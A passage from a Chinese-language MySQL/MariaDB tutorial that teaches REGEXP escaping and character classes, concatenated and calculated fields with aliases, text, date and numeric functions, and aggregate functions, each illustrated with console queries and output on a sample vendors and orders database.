字符的值,怎样搜索? 123456789101112131415161718192021222324252627282930313233MariaDB [test]&gt; select vend_name from vendors where vend_name regexp &apos;.&apos;;+----------------+| vend_name |+----------------+| Anvils R Us || LT Supplies || ACME || Furball Inc. || Jet Set || Jouets Et Ours |+----------------+6 rows in set (0.00 sec)MariaDB [test]&gt; select vend_name from vendors where vend_name regexp &apos;\\.&apos;;+----------------+| vend_name |+----------------+| Anvils R Us || LT Supplies || ACME || Furball Inc. || Jet Set || Jouets Et Ours |+----------------+6 rows in set (0.00 sec)MariaDB [test]&gt; select vend_name from vendors where vend_name regexp &apos;\\\\.&apos;;+--------------+| vend_name |+--------------+| Furball Inc. |+--------------+1 row in set (0.00 sec) 这才是期望的输出。 \\\\. 匹配 . ,所以只检索出一行。这种处理就是所谓的 转义(escaping), 正则表达式内具有特殊意义的所有字符都必须以这种方式转义。 这包括 . 、 | 、 [] 以及迄今为止使用过的其他特殊字符。 为了匹配特殊字符,必须用 \\\\ 为前导。 \\\\- 表示查找 - , \\\\. 表示查找 . 。 匹配 \\ 为了匹配反斜杠(\\)字符本身,需要使用 \\\\\\ 。 \\\\也用来引用元字符(具有特殊含义的字符),如下表所列。 元 字 符 说 明 \\f 换页 \\n 换行 \\r 回车 \\t 制表 \\v 纵向制表 \\ 或 \\\\? 多数正则表达式实现使用单个反斜杠转义特殊字符,以便能使用这些字符本身。 但MySQL要求两个反斜杠(MySQL自己解释一个,正则表达式库解释另一个)。 6.匹配字符类 存在找出你自己经常使用的数字、所有字母字符或所有数字字母字符等的匹配。 为更方便工作,可以使用预定义的字符集,称为 字符类(character class) 下表列出字符类以及它们的含义： 类 说 明 [:alnum:] 任意字母和数字(同[a-zA-Z0-9]) [:alpha:] 任意字符(同[a-zA-Z]) [:blank:] 空格和制表(同[\\t]) [:cntrl:] ASCII控制字符(ASCII 0到31和127) [:digit:] 任意数字(同[0-9]) [:graph:] 与[:print:]相同,但不包括空格 [:lower:] 任意小写字母(同[a-z]) [:print:] 任意可打印字符 [:punct:] 既不在[:alnum:]又不在[:cntrl:]中的任意字符 [:space:] 包括空格在内的任意空白字符(同[\\f\\n\\r\\t\\v]) [:upper:] 任意大写字母(同[A-Z]) [:xdigit:] 任意十六进制数字(同[a-fA-F0-9] 7.匹配多个实例 目前为止使用的所有正则表达式都试图匹配单次出现。 如果存在一个匹配,该行被检索出来,如果不存在,检索不出任何行。 但有时需要对匹配的数目进行更强的控制。 例如,你可能需要寻找所有的数,不管数中包含多少数字,或者你可能想寻找一个单词并且还能够适应一个尾随的 s (如果存在),等等。 这可以用下表列出的正则表达式重复元字符来完成。 重复元字符 说明 * 0个或多个匹配 + 1个或多个匹配(等于{1,}) ? 0个或1个匹配(等于{0,1}) {n} 指定数目的匹配 {n,} 不少于指定数目的匹配 {n,m} 匹配数目的范围(m不超过255) prod_name列中匹配包括括号，并且括号中的内容依次为 一位数字，一个空格，stick，s有或者没有 12345678MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;\\\\([0-9] sticks?\\\\)&apos;;+----------------+| prod_name |+----------------+| TNT (1 stick) || TNT (5 sticks) |+----------------+2 rows in set (0.00 sec) prod_name列中匹配4个数字 12345678MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;[[:digit:]]{4}&apos;;+--------------+| prod_name |+--------------+| JetPack 1000 || JetPack 2000 |+--------------+2 rows in set (0.00 sec） 需要注意的是,在使用正则表达式时,编写某个特殊的表达式几乎总是有不止一种方法。上面的例子也可以如下编写: 12345678MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;[0-9][0-9][0-9][0-9]&apos;;+--------------+| prod_name |+--------------+| JetPack 1000 || JetPack 2000 |+--------------+2 rows in set (0.00 sec) 8.定位符 目前为止的所有例子都是匹配一个串中任意位置的文本。为了匹配特定位置的文本,需要使用下表列出的定位符。 定位元字符 说 明 ^ 文本的开始 $ 文本的结尾 [[:&lt;:]] 词的开始 [[:&gt;:]] 词的结尾 找出以一个数(包括以小数点开始的数)开始的所有产品 12345678910111213141516171819202122MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;[0-9\\\\.]&apos;;+----------------+| prod_name |+----------------+| .5 ton anvil || 1 ton anvil || 2 ton anvil || JetPack 1000 || JetPack 2000 || TNT (1 stick) || TNT (5 sticks) |+----------------+7 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;^[0-9\\\\.]&apos;;+--------------+| prod_name |+--------------+| .5 ton anvil || 1 ton anvil || 2 ton anvil |+--------------+3 rows in set (0.00 sec) 简单搜索 [0-9\\.] (或 [[:digit:]\\.] )不行,因为它将在文本内任意位置查找匹配。解决办法是使用 ^ 定位符 ^ 的双重用途 ^ 有两种用法。在集合中(用 [ 和 ] 定义),用它来否定该集合,否则,用来指串的开始处。 使 REGEXP 起类似 LIKE 的作用 本章前面说过, LIKE 和 REGEXP的不同在于, LIKE 匹配整个串而 REGEXP 匹配子串。 利用定位符,通过用 ^ 开始每个表达式,用 $ 结束每个表达式,可以使REGEXP 的作用与 LIKE 一样。 简单的正则表达式测试 可以在不使用数据库表的情况下用SELECT 来测试正则表达式。 REGEXP 检查总是返回 0 (没有匹配)或 1 (匹配)。可以用带文字串的 REGEXP 来测试表达式,并试验它们。相应的语法如下: 测试文本 hello 中是否能匹配到数字 1234567MariaDB [test]&gt; select &apos;hello&apos; regexp &apos;[0-9]&apos;;+------------------------+| &apos;hello&apos; regexp &apos;[0-9]&apos; |+------------------------+| 0 |+------------------------+1 row in set (0.00 sec) 测试文本中是否能匹配到制定数量的o 123456789101112131415MariaDB [test]&gt; select &apos;booboo&apos; regexp &apos;[o]{3,}&apos;;+---------------------------+| &apos;booboo&apos; regexp &apos;[o]{3,}&apos; |+---------------------------+| 0 |+---------------------------+1 row in set (0.00 sec)MariaDB [test]&gt; select &apos;boobooo&apos; regexp &apos;[o]{3,}&apos;;+----------------------------+| &apos;boobooo&apos; regexp &apos;[o]{3,}&apos; |+----------------------------+| 1 |+----------------------------+1 row in set (0.00 sec) 小结 本章介绍了正则表达式的基础知识,学习了如何在MySQL的 SELECT语句中通过 REGEXP 关键字使用它们。 创建计算字段本章介绍什么是计算字段,如何创建计算字段以及怎样从应用程序中使用别名引用它们。 计算字段 存储在数据库表中的数据一般不是应用程序所需要的格式。下面举几个例子。 如果想在一个字段中既显示公司名,又显示公司的地址,但这两个信息一般包含在不同的表列中。 城市、州和邮政编码存储在不同的列中(应该这样),但邮件标签打印程序却需要把它们作为一个恰当格式的字段检索出来。 列数据是大小写混合的,但报表程序需要把所有数据按大写表示出来。 物品订单表存储物品的价格和数量,但不需要存储每个物品的总价格(用价格乘以数量即可)。为打印发票,需要物品的总价格。 需要根据表数据进行总数、平均数计算或其他计算。 在上述每个例子中,存储在表中的数据都不是应用程序所需要的。 我们需要直接从数据库中检索出转换、计算或格式化过的数据;而不是检索出数据,然后再在客户机应用程序或报告程序中重新格式化。 这就是计算字段发挥作用的所在了。与前面各章介绍过的列不同,计算字段并不实际存在于数据库表中。计算字段是运行时在 SELECT 语句内创建的。 字段(field) 基本上与列(column)的意思相同,经常互换使用,不过数据库列一般称为列,而术语字段通常用在计算字段的连接上。重要的是要注意到,只有数据库知道 SELECT 语句中哪些列是实际的表列,哪些列是计算字段。从客户机(如应用程序)的角度来看,计算字段的数据是以与其他列的数据相同的方式返回的。 客户机与服务器的格式 可在SQL语句内完成的许多转换和格式化工作都可以直接在客户机应用程序内完成。但一般来说,在数据库服务器上完成这些操作比在客户机中完成要快得多,因为DBMS是设计来快速有效地完成这种处理的。 拼接字段 为了说明如何使用计算字段,举一个创建由两列组成的标题的简单例子。 vendors 表包含供应商名和位置信息。假如要生成一个供应商报表,需要在供应商的名字中按照 name (location) 这样的格式列出供应商的位置。 此报表需要单个值,而表中数据存储在两个列 vend_name 和 vend_country 中。 此外,需要用括号将 vend_country 括起来,这些东西都没有明确存储在数据库表中。我们来看看怎样编写返回供应商名和位置的SELECT 语句。 拼接(concatenate) 将值联结到一起构成单个值。 解决办法是把两个列拼接起来。在MySQL的 SELECT 语句中,可使用Concat() 函数来拼接两个列。 MySQL的不同之处 多数DBMS使用 + 或 || 来实现拼接,MySQL则使用 Concat() 函数来实现。当把SQL语句转换成MySQL语句时一定要把这个区别铭记在心。 12345678910111213141516171819202122232425MariaDB [test]&gt; select concat(vend_name,vend_country) from vendors;+--------------------------------+| concat(vend_name,vend_country) |+--------------------------------+| Anvils R UsUSA || LT SuppliesUSA || ACMEUSA || Furball Inc.USA || Jet SetEngland || Jouets Et OursFrance |+--------------------------------+6 rows in set (0.01 sec)MariaDB [test]&gt; select concat(vend_name,&apos; (&apos;,vend_country,&apos;)&apos;) from vendors;+-----------------------------------------+| concat(vend_name,&apos; (&apos;,vend_country,&apos;)&apos;) |+-----------------------------------------+| Anvils R Us (USA) || LT Supplies (USA) || ACME (USA) || Furball Inc. (USA) || Jet Set (England) || Jouets Et Ours (France) |+-----------------------------------------+6 rows in set (0.00 sec) Concat() 拼接串,即把多个串连接起来形成一个较长的串。 Concat() 需要一个或多个指定的串,各个串之间用逗号分隔。 上面的 SELECT 语句连接以下4个元素: 存储在 vend_name 列中的名字; 包含一个空格和一个左圆括号的串; 存储在 vend_country 列中的国家; 包含一个右圆括号的串。 从上述输出中可以看到, SELECT 语句返回包含上述4个元素的单个列(计算字段)。 在前面曾提到通过删除数据右侧多余的空格来整理数据,这可以使用MySQL的 RTrim() 函数来完成,如下所示: 123456789101112MariaDB [test]&gt; select concat(rtrim(vend_name),&apos; (&apos;,rtrim(vend_country),&apos;)&apos;) from vendors;+-------------------------------------------------------+| concat(rtrim(vend_name),&apos; (&apos;,rtrim(vend_country),&apos;)&apos;) |+-------------------------------------------------------+| Anvils R Us (USA) || LT Supplies (USA) || ACME (USA) || Furball Inc. (USA) || Jet Set (England) || Jouets Et Ours (France) |+-------------------------------------------------------+6 rows in set (0.00 sec) Trim 函数 MySQL除了支持 RTrim() (正如刚才所见,它去掉串右边的空格),还支持 LTrim() (去掉串左边的空格)以及Trim() (去掉串左右两边的空格)。 使用别名 从前面的输出中可以看到, SELECT 语句拼接地址字段工作得很好。但此新计算列的名字是什么呢?实际上它没有名字,它只是一个值。如果仅在SQL查询工具中查看一下结果,这样没有什么不好。但是,一个未命名的列不能用于客户机应用中,因为客户机没有办法引用它。为了解决这个问题,SQL支持列别名。 别名(alias) 是一个字段或值的替换名。别名用 AS 关键字赋予。 创建一个包含指定计算的名为 vend_title 的计算字段 123456789101112MariaDB [test]&gt; select concat(rtrim(vend_name),&apos; (&apos;,rtrim(vend_country),&apos;)&apos;) as vend_title from vendors order by vend_name;+-------------------------+| vend_title |+-------------------------+| ACME (USA) || Anvils R Us (USA) || Furball Inc. (USA) || Jet Set (England) || Jouets Et Ours (France) || LT Supplies (USA) |+-------------------------+6 rows in set (0.00 sec) 别名的其他用途 别名还有其他用途。常见的用途包括在实际的表列名包含不符合规定的字符(如空格)时重新命名它,在原来的名字含混或容易误解时扩充它,等等。 导出列 别名有时也称为导出列(derived column),不管称为什么,它们所代表的都是相同的东西。 执行算术计算 计算字段的另一常见用途是对检索出的数据进行算术计算。 orders 表包含收到的所有订单, orderitems 表包含每个订单中的各项物品。SQL语句检索订单号 20005 中的所有物品，并汇总物品的价格(单价乘以订购数量) 123456789101112131415161718192021MariaDB [test]&gt; select *,quantity*item_price as expanded_price from orderitems where order_num = 20005;+-----------+------------+---------+----------+------------+----------------+| order_num | order_item | prod_id | quantity | item_price | expanded_price |+-----------+------------+---------+----------+------------+----------------+| 20005 | 1 | ANV01 | 10 | 5.99 | 59.90 || 20005 | 2 | ANV02 | 3 | 9.99 | 29.97 || 20005 | 3 | TNT2 | 5 | 10.00 | 50.00 || 20005 | 4 | FB | 1 | 10.00 | 10.00 |+-----------+------------+---------+----------+------------+----------------+4 rows in set (0.00 sec)MariaDB [test]&gt; select *,quantity*item_price expanded_price from orderitems where order_num = 20005;+-----------+------------+---------+----------+------------+----------------+| order_num | order_item | prod_id | quantity | item_price | expanded_price |+-----------+------------+---------+----------+------------+----------------+| 20005 | 1 | ANV01 | 10 | 5.99 | 59.90 || 20005 | 2 | ANV02 | 3 | 9.99 | 29.97 || 20005 | 3 | TNT2 | 5 | 10.00 | 50.00 || 20005 | 4 | FB | 1 | 10.00 | 10.00 |+-----------+------------+---------+----------+------------+----------------+4 rows in set (0.00 sec) MySQL支持下表中列出的基本算术操作符。此外,圆括号可用来区分优先顺序。 MySQL算术操作符 说 明 + 加 - 减 * 乘 / 除 如何测试计算 SELECT 提供了测试和试验函数与计算的一个很好的办法。虽然 SELECT 通常用来从表中检索数据,但可以省略 FROM 子句以便简单地访问和处理表达式。通过下面一些例子,可以明白如何根据需要使用 SELECT 进行试验。 SELECT3*2; 将返回 6 1234567MariaDB [(none)]&gt; select 3*2;+-----+| 3*2 |+-----+| 6 |+-----+1 row in set (0.00 sec) SELECT Trim(‘ abc ‘); 将返回 abc 1234567MariaDB [(none)]&gt; select trim(&apos; abc &apos;);+---------------+| trim(&apos; abc &apos;) |+---------------+| abc |+---------------+1 row in set (0.00 sec) SELECT Now() 利用 Now() 函数返回当前日期和时间。 1234567MariaDB [(none)]&gt; select now();+---------------------+| now() |+---------------------+| 2016-09-17 21:25:08 |+---------------------+1 row in set (0.00 sec) 小结 本章介绍了计算字段以及如何创建计算字段。我们用例子说明了计算字段在串拼接和算术计算的用途。此外,还学习了如何创建和使用别名,以便应用程序能引用计算字段。 使用数据处理函数本章介绍什么是函数, MySQL支持何种函数,以及如何使用这些函数。 函数 与其他大多数计算机语言一样, SQL支持利用函数来处理数据。函数一般是在数据上执行的,它给数据的转换和处理提供了方便。 在前一章中用来去掉串尾空格的 RTrim() 就是一个函数的例子。 函数没有SQL的可移植性强 能运行在多个系统上的代码称为可移植的(portable)。相对来说,多数SQL语句是可移植的,在SQL实现之间有差异时,这些差异通常不那么难处理。而函数的可移植性却不强。几乎每种主要的DBMS的实现都支持其他实现不支持的函数,而且有时差异还很大。为了代码的可移植,许多SQL程序员不赞成使用特殊实现的功能。虽然这样做很有好处,但不总是利于应用程序的性能。如果不使用这些函数,编写某些应用程序代码会很艰难。必须利用其他方法来实现DBMS非常有效地完成的工作。如果你决定使用函数,应该保证做好代码注释,以便以后你(或其他人)能确切地知道所编写SQL代码的含义。 使用函数 大多数SQL实现支持以下类型的函数。 用于处理文本串(如删除或填充值,转换值为大写或小写)的文本函数。 用于在数值数据上进行算术操作(如返回绝对值,进行代数运算)的数值函数。 用于处理日期和时间值并从这些值中提取特定成分(例如,返回两个日期之差,检查日期有效性等)的日期和时间函数。 返回DBMS正使用的特殊信息(如返回用户登录信息,检查版本细节)的系统函数。 1.文本处理函数 上一章中我们已经看过一个文本处理函数的例子,其中使用 RTrim()函数来去除列值右边的空格。下面是另一个例子,这次使用 Upper() 函数Upper() ：将文本转换为大写。 检索供应商表vendors中的供应商名vend_name，并都转换为大写，排序。 123456789101112MariaDB [test]&gt; select vend_name,upper(vend_name) as vend_name_upcase from vendors order by vend_name;+----------------+------------------+| vend_name | vend_name_upcase |+----------------+------------------+| ACME | ACME || Anvils R Us | ANVILS R US || Furball Inc. | FURBALL INC. || Jet Set | JET SET || Jouets Et Ours | JOUETS ET OURS || LT Supplies | LT SUPPLIES |+----------------+------------------+6 rows in set (0.00 sec) 下表列出了某些常用的文本处理函数。 常用的文本处理函数 说 明 Left() 返回串左边的字符 Right() 返回串右边的字符 Lower() 将串转换为小写 Upper() 将串转换为大写 LTrim() 去掉串左边的空格 RTrim() 去掉串右边的空格 Length() 返回串的长度 Soundex() 返回串的SOUNDEX值 Locate() 找出串的一个子串 SubString() 返回子串的字符 上表中的 SOUNDEX 需要做进一步的解释。 SOUNDEX 是一个将任何文本串转换为描述其语音表示的字母数字模式的算法。 SOUNDEX 考虑了类似的发音字符和音节,使得能对串进行发音比较而不是字母比较。虽然SOUNDEX 不是SQL概念,但MySQL(就像多数DBMS一样)都提供对SOUNDEX 的支持。 下面给出一个使用 Soundex() 函数的例子。 customers 表中有一个顾客 Coyote Inc. ,其联系名为Y Lee。但如果这是输入错误,此联系名实际应该是 Y Lie ,怎么办?显然,按正确的联系名搜索不会返回数据。 12345678910MariaDB [test]&gt; select cust_name,cust_contact from customers where cust_contact = &apos;Y Lie&apos;;Empty set (0.00 sec)MariaDB [test]&gt; select cust_name,cust_contact from customers where soundex(cust_contact) = soundex(&apos;Y Lie&apos;);+-------------+--------------+| cust_name | cust_contact |+-------------+--------------+| Coyote Inc. | Y Lee |+-------------+--------------+1 row in set (0.00 sec) 2.日期和时间处理函数 日期和时间采用相应的数据类型和特殊的格式存储,以便能快速和有效地排序或过滤,并且节省物理存储空间。 一般,应用程序不使用用来存储日期和时间的格式,因此日期和时间函数总是被用来读取、统计和处理这些值。由于这个原因,日期和时间函数在MySQL语言中具有重要的作用。 下表列出了某些常用的日期和时间处理函数。 常用日期和时间处理函数 说 明 AddDate() 增加一个日期(天、周等) AddTime() 增加一个时间(时、分等) CurDate() 返回当前日期 CurTime() 返回当前时间 Date() 返回日期时间的日期部分 DateDiff() 计算两个日期之差 Date_Add() 高度灵活的日期运算函数 Date_Format() 返回一个格式化的日期或时间串 Day() 返回一个日期的天数部分 DayOfWeek() 对于一个日期,返回对应的星期几 Hour() 返回一个时间的小时部分 Minute() 返回一个时间的分钟部分 Month() 返回一个日期的月份部分 Now() 返回当前日期和时间 Second() 返回一个时间的秒部分 Time() 返回一个日期时间的时间部分 Year() 返回一个日期的年份部分 这是重新复习用 WHERE 进行数据过滤的一个好时机。迄今为止,我们都是用比较数值和文本的 WHERE 子句过滤数据,但数据经常需要用日期进行过滤。用日期进行过滤需要注意一些别的问题和使用特殊的MySQL函数。 首先需要注意的是MySQL使用的日期格式。无论你什么时候指定一个日期,不管是插入或更新表值还是用 WHERE 子句进行过滤,日期必须为格式yyyy-mm-dd。因此,2005年9月1日,给出为2005-09-01。虽然其他的日期格式可能也行,但这是首选的日期格式,因为它排除了多义性(如,04/05/06是2006年5月4日或2006年4月5日或2004年5月6日或……)。 应该总是使用4位数字的年份 支持2位数字的年份,MySQL处理00-69为2000-2069,处理70-99为1970-1999。虽然它们可能是打算要的年份,但使用完整的4位数字年份更可靠,因为MySQL不必做出任何假定。 检索出一个订单记录,该订单记录的 order_date 为 2005-09-01 1234567MariaDB [test]&gt; select * from orders where order_date=&apos;2005-09-01&apos;;+-----------+---------------------+---------+| order_num | order_date | cust_id |+-----------+---------------------+---------+| 20005 | 2005-09-01 00:00:00 | 10001 |+-----------+---------------------+---------+1 row in set (0.00 sec) 但是,使用 WHERE order_date = &apos;2005-09-01&apos; 可靠吗? order_date的数据类型为 datetime 。这种类型存储日期及时间值。样例表中的值全都具有时间值 00:00:00 ,但实际中很可能并不总是这样。如果用当前日期和时间存储订单日期(因此你不仅知道订单日期,还知道下订单当天的时间),怎么办? 比如,存储的 order_date 值为2005-09-01 11:30:05 ,则 WHERE order_date = &apos;2005-09-01&apos; 失败。即使给出具有该日期的一行,也不会把它检索出来,因为 WHERE 匹配失败。 解决办法是指示MySQL仅将给出的日期与列中的日期部分进行比较,而不是将给出的日期与整个列值进行比较。为此,必须使用 Date()函数。 Date(order_date)指示MySQL仅提取列的日期部分,更可靠的SELECT 语句为: 1234567MariaDB [test]&gt; select * from orders where date(order_date)=&apos;2005-09-01&apos;;+-----------+---------------------+---------+| order_num | order_date | cust_id |+-----------+---------------------+---------+| 20005 | 2005-09-01 00:00:00 | 10001 |+-----------+---------------------+---------+1 row in set (0.00 sec) 如果要的是日期,请使用 Date() 如果你想要的仅是日期,则使用 Date() 是一个良好的习惯,即使你知道相应的列只包含日期也是如此。这样,如果由于某种原因表中以后有日期和时间值,你的SQL代码也不用改变。当然,也存在一个 Time()函数,在你只想要时间时应该使用它。Date() 和 Time() 都是在MySQL 4.1.1中第一次引入的。 在你知道了如何用日期进行相等测试后,其他操作符的使用也就很清楚了。不过,还有一种日期比较需要说明。 检索出2005年9月下的所有订单 123456789MariaDB [test]&gt; select * from orders where date(order_date) between &apos;2005-09-01&apos; and &apos;2005-09-30&apos;;+-----------+---------------------+---------+| order_num | order_date | cust_id |+-----------+---------------------+---------+| 20005 | 2005-09-01 00:00:00 | 10001 || 20006 | 2005-09-12 00:00:00 | 10003 || 20007 | 2005-09-30 00:00:00 | 10004 |+-----------+---------------------+---------+3 rows in set (0.00 sec) 还有另外一种办法(一种不需要记住每个月中有多少天或不需要操心闰年2月的办法) 123456789MariaDB [test]&gt; select * from orders where year(order_date) = 2005 and month(order_date)= 9 ;+-----------+---------------------+---------+| order_num | order_date | cust_id |+-----------+---------------------+---------+| 20005 | 2005-09-01 00:00:00 | 10001 || 20006 | 2005-09-12 00:00:00 | 10003 || 20007 | 2005-09-30 00:00:00 | 10004 |+-----------+---------------------+---------+3 rows in set (0.01 sec) MySQL的版本差异 MySQL 4.1.1中增加了许多日期和时间函数。如果你使用的是更早的MySQL版本,应该查阅具体的文档以确定可以使用哪些函数。 3.数值处理函数 数值处理函数仅处理数值数据。这些函数一般主要用于代数、三角或几何运算,因此没有串或日期—时间处理函数的使用那么频繁。 具有讽刺意味的是,在主要DBMS的函数中,数值函数是最一致最统一的函数。下表列出一些常用的数值处理函数。 常用数值处理函数 说 明 Abs() 返回一个数的绝对值 Cos() 返回一个角度的余弦 Exp() 返回一个数的指数值 Mod() 返回除操作的余数 Pi() 返回圆周率 Rand() 返回一个随机数 Sin() 返回一个角度的正弦 Sqrt() 返回一个数的平方根 Tan() 返回一个角度的正切 测试函数功能 123456789101112131415MariaDB [test]&gt; select pi();+----------+| pi() |+----------+| 3.141593 |+----------+1 row in set (0.00 sec)MariaDB [test]&gt; select rand();+--------------------+| rand() |+--------------------+| 0.7680412305221346 |+--------------------+1 row in set (0.00 sec) 小结 本章介绍了如何使用SQL的数据处理函数,并着重介绍了日期处理函数。 汇总数据本章介绍什么是SQL的聚集函数以及如何利用它们汇总表的数据。 聚集函数 我们经常需要汇总数据而不用把它们实际检索出来,为此MySQL提供了专门的函数。使用这些函数,MySQL查询可用于检索数据,以便分析和报表生成。这种类型的检索例子有以下几种。 确定表中行数(或者满足某个条件或包含某个特定值的行数)。 获得表中行组的和。 找出表列(或所有行或某些特定的行)的最大值、最小值和平均值。 上述例子都需要对表中数据(而不是实际数据本身)汇总。因此,返回实际表数据是对时间和处理资源的一种浪费(更不用说带宽了)。重复一遍,实际想要的是汇总信息。 为方便这种类型的检索,MySQL给出了5个聚集函数，见下表，这些函数能进行上述罗列的检索。 聚集函数(aggregate function) 运行在行组上,计算和返回单个值的函数。 SQL聚集函数 说明 AVG() 返回某列的平均值 COUNT() 返回某列的行数 MAX() 返回某列的最大值 MIN() 返回某列的最小值 SUM() 返回某列值之和 标准偏差 MySQL还支持一系列的标准偏差聚集函数,但该教案并未涉及这些内容。 1.AVG() 函数 AVG() 通过对表中行数计数并计算特定列值之和,求得该列的平均值。 AVG() 可用来返回所有列的平均值,也可以用来返回特定列或行的平均值。 使用 AVG() 返回 products 表中所有产品的平均价格 avg_Price 1234567MariaDB [test]&gt; select avg(prod_price) as avg_price from products;+-----------+| avg_price |+-----------+| 16.133571 |+-----------+1 row in set (0.00 sec) 使用 AVG() 返回 products 表中产品供应商1003提供的商品的平均价格 avg_Price 1234567MariaDB [test]&gt; select avg(prod_price) as avg_price from products where vend_id=1003;+-----------+| avg_price |+-----------+| 13.212857 |+-----------+1 row in set (0.00 sec) 只用于单个列 AVG() 只能用来确定特定数值列的平均值,而且列名必须作为函数参数给出。为了获得多个列的平均值,必须使用多个 AVG() 函数。 NULL 值 AVG() 函数忽略列值为 NULL 的行 2.COUNT() 函数 COUNT() 函数进行计数。可利用 COUNT() 确定表中行的数目或符合特定条件的行的数目。 COUNT() 函数有两种使用方式。 使用 COUNT(*) 对表中行的数目进行计数,不管表列中包含的是空值( NULL )还是非空值。 使用 COUNT(column) 对特定列中具有值的行进行计数,忽略NULL 值。 返回 customers 表中客户的总数 123456789101112131415MariaDB [test]&gt; select count(prod_name) from products;+------------------+| count(prod_name) |+------------------+| 14 |+------------------+1 row in set (0.00 sec)MariaDB [test]&gt; select count(*) from products;+----------+| count(*) |+----------+| 14 |+----------+1 row in set (0.00 sec) 对具有电子邮件地址的客户计数,别名num_cust 1234567891011121314151617181920212223242526272829303132333435MariaDB [test]&gt; select cust_email from customers;+---------------------+| cust_email |+---------------------+| ylee@coyote.com || NULL || rabbit@wascally.com || sam@yosemite.com || NULL |+---------------------+5 rows in set (0.00 sec)MariaDB [test]&gt; select count(cust_email) from customers;+-------------------+| count(cust_email) |+-------------------+| 3 |+-------------------+1 row in set (0.00 sec)MariaDB [test]&gt; select count(*) from customers;+----------+| count(*) |+----------+| 5 |+----------+1 row in set (0.00 sec)MariaDB [test]&gt; select count(cust_email) as num_cust from customers;+----------+| num_cust |+----------+| 3 |+----------+1 row in set (0.00 sec) NULL 值 如果指定列名,则指定列的值为空的行被 COUNT()函数忽略,但如果 COUNT() 函数中用的是星号( * ),则不忽略。 3.MAX() 函数 MAX() 返回指定列中的最大值。 MAX() 要求指定列名。 MAX() 返回 products 表中最贵的物品的价格 1234567MariaDB [test]&gt; select prod_name,max(prod_price) as max_price from products;+--------------+-----------+| prod_name | max_price |+--------------+-----------+| .5 ton anvil | 55.00 |+--------------+-----------+1 row in set (0.00 sec) 对非数值数据使用 MAX() 虽然 MAX() 一般用来找出最大的数值或日期值,但MySQL允许将它用来返回任意列中的最大值,包括返回文本列中的最大值。在用于文本数据时,如果数据按相应的列排序,则 MAX() 返回最后一行。 1234567MariaDB [test]&gt; select prod_name,max(prod_name) as max_name from products;+--------------+----------------+| prod_name | max_name |+--------------+----------------+| .5 ton anvil | TNT (5 sticks) |+--------------+----------------+1 row in set (0.00 sec) NULL 值 MAX() 函数忽略列值为 NULL 的行。 4.MIN() 函数 MIN() 的功能正好与 MAX() 功能相反,它返回指定列的最小值。与MAX() 一样, MIN() 要求指定列名。 MIN() 返回 products 表中最便宜物品的价格 1234567MariaDB [test]&gt; select prod_name,min(prod_price) as min_price from products;+--------------+-----------+| prod_name | min_price |+--------------+-----------+| .5 ton anvil | 2.50 |+--------------+-----------+1 row in set (0.00 sec) 对非数值数据使用 MIN() MIN() 函数与 MAX() 函数类似,MySQL允许将它用来返回任意列中的最小值,包括返回文本列中的最小值。在用于文本数据时,如果数据按相应的列排序,则 MIN() 返回最前面的行。 NULL 值 MIN() 函数忽略列值为 NULL 的行。 5.SUM() 函数 SUM() 用来返回指定列值的和(总计)。 orderitems表 包含订单中实际的物品,每个物品有相应的数量( quantity )。检索所订购物品的总数(所有quantity 值之和) 123456789101112131415161718192021222324252627MariaDB [test]&gt; desc orderitems;+------------+--------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+------------+--------------+------+-----+---------+-------+| order_num | int(11) | NO | PRI | NULL | || order_item | int(11) | NO | PRI | NULL | || prod_id | char(10) | NO | MUL | NULL | || quantity | int(11) | NO | | NULL | || item_price | decimal(8,2) | NO | | NULL | |+------------+--------------+------+-----+---------+-------+5 rows in set (0.00 sec)MariaDB [test]&gt; select sum(quantity) from orderitems;+---------------+| sum(quantity) |+---------------+| 174 |+---------------+1 row in set (0.00 sec)MariaDB [test]&gt; select sum(quantity) as items_ordered from orderitems where order_num = 20005;+---------------+| items_ordered |+---------------+| 19 |+---------------+1 row in set (0.00 sec) SUM() 也可以用来合计计算值。在下面的例子中,合计每项物品的item_price*quantity ,得出总的订单金额total_price 12345678910111213141516171819202122232425MariaDB [test]&gt; select item_price*quantity from orderitems;+---------------------+| item_price*quantity |+---------------------+| 59.90 || 29.97 || 50.00 || 10.00 || 55.00 || 1000.00 || 125.00 || 10.00 || 8.99 || 4.49 || 14.99 |+---------------------+11 rows in set (0.00 sec)MariaDB [test]&gt; select sum(item_price*quantity) as total_price from orderitems;+-------------+| total_price |+-------------+| 1368.34 |+-------------+1 row in set (0.01 sec) 在多个列上进行计算 如本例所示,利用标准的算术操作符,所有聚集函数都可用来执行多个列上的计算。 NULL 值 SUM() 函数忽略列值为 NULL 的行。 聚集不同值 MySQL 5 及 后 期 版 本 下面将要介绍的聚集函数的DISTINCT 的使用,已经被添加到MySQL 5.0.3中。下面所述内容在MySQL 4.x中不能正常运行。 以上5个聚集函数都可以如下使用: 对所有的行执行计算,指定 ALL 参数或不给参数(因为 ALL 是默认行为); 只包含不同的值,指定 DISTINCT 参数。 ALL 为默认 ALL 参数不需要指定,因为它是默认行为。如果不指定 DISTINCT ,则假定为 ALL 。 使用 AVG() 函数返回特定供应商提供的产品的平均价格。它与上面的 SELECT 语句相同,但使用了 DISTINCT 参数,因此平均值只考虑各个不同的价格: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455MariaDB [test]&gt; select prod_price from products order by prod_price;+------------+| prod_price |+------------+| 2.50 || 2.50 || 3.42 || 4.49 || 5.99 || 8.99 || 9.99 || 10.00 || 10.00 || 13.00 || 14.99 || 35.00 || 50.00 || 55.00 |+------------+14 rows in set (0.00 sec)MariaDB [test]&gt; select distinct prod_price from products order by prod_price;+------------+| prod_price |+------------+| 2.50 || 3.42 || 4.49 || 5.99 || 8.99 || 9.99 || 10.00 || 13.00 || 14.99 || 35.00 || 50.00 || 55.00 |+------------+12 rows in set (0.00 sec)MariaDB [test]&gt; select avg(distinct prod_price) from products where vend_id = 1003;+--------------------------+| avg(distinct prod_price) |+--------------------------+| 15.998000 |+--------------------------+1 row in set (0.00 sec)MariaDB [test]&gt; select avg(prod_price) from products where vend_id = 1003;+-----------------+| avg(prod_price) |+-----------------+| 13.212857 |+-----------------+1 row in set (0.00 sec)可以看到,在使用了 DISTINCT 后,此例子中的 avg_price 